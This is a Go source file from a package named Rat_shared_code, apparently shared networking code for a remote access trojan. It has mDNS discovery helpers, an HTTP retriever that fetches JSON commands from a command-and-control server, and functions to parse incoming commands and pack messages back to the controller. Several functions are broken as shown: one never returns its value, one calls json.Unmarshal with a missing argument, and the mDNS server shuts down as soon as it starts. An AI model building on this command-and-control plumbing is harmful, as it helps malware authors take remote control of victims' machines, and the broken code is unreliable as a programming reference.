/*/
This file contains the functions necessary for input and output
from files, networks, software, etc...

/*/
package Rat_shared_code

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"

	"github.com/hashicorp/mdns"
)

/*/
MDNS: https://en.wikipedia.org/wiki/Multicast_DNS
https://tools.ietf.org/html/rfc6762

resolves hostnames to IP addresses within small networks that do not include
a local name server. It is a zero-configuration service, using essentially the
same programming interfaces, packet formats and operating semantics as the unicast
Domain Name System (DNS). Although Stuart Cheshire designed mDNS as a stand-alone
protocol, it can work in concert with standard DNS servers.

An mDNS message is a multicast UDP packet sent using the following addressing:

    IPv4 address 224.0.0.251
	IPv6 address ff02::fb
    UDP port 5353
    When using Ethernet frames, the standard IP multicast MAC address:
		01:00:5E:00:00:FB (for IPv4)
		33:33:00:00:00:FB (for IPv6)
/*/
func MdnsResponder() {
	// Make a channel for results and start listening
	entriesCh := make(chan *mdns.ServiceEntry, 4)
	go func() {
		for entry := range entriesCh {
			fmt.Printf("Got new entry: %v\n", entry)
		}
	}()
	// Start the lookup
	mdns.Lookup("_foobar._tcp", entriesCh)
	close(entriesCh)
}

func StartMdnsReceiver(service_name string, false_service_struct FakeMDNSService) {
	// Setup our service export
	host, _ := os.Hostname()
	info := []string{"My awesome service"}
	service, _ := mdns.NewMDNSService(host, "_foobar._tcp", "", "", 8000, nil, info)
	// Create the mDNS server, defer shutdown
	server, _ := mdns.NewServer(&mdns.Config{Zone: service})
	defer server.Shutdown()
}

// this function is to extract JSON data from HTTP Server on C&C
func HTTPRetriever(method string, http_addr string) []byte {
	switch method {
	case "get":
		response, derp := http.Get(http_addr)
		if derp != nil {
			log.Fatalln(derp)
		}
		//We Read the response body on the line below.
		body, err := ioutil.ReadAll(response.Body)
		if err != nil {
			log.Fatalln(err)
		}
		//Convert the body to json, we are relying on the fact that the C&C
		// only ever responds in pure JSON
		json.Unmarshal(body)
	}
}

//
// This function of for extracting messages sent in json into the
// Command type
// This gets placed in a loop to handle net.Conn type
// containing json AFTER AUTH
func Json_extract(text string, command_struct Command) {
	/*/
		use Unmarshal if we expect our data to be pure JSON
		second parameter is the address of the struct
		we want to store our arsed data in
	/*/

	json.Unmarshal([]byte(text), &command_struct)
}

/*/
Function for packing up a string to send down the wire to the command and control
/*/
func Json_pack(json_string string, outgoing_message OutgoingMessage) []byte {
	encoded_json, err := json.Marshal(json_string)
	if err != nil {
		Error_printer(err, "[-] Problem with JSON packing function")
	}
	return encoded_json
}
